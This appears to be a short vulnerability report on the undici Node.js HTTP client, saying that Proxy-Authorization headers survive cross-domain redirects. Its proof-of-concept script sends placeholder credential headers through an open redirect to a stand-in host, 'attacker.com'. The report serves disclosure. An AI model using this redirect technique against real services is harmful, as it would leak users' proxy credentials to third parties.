## Original Report

I read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-wqq4-5wpv-mx2g.
It only clears authorization and cookie header during cross-domain redirect .
{F3080120}


As such this may lead to accidental leakage of "Proxy-Authorization" to a 3rd-party site.
```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```
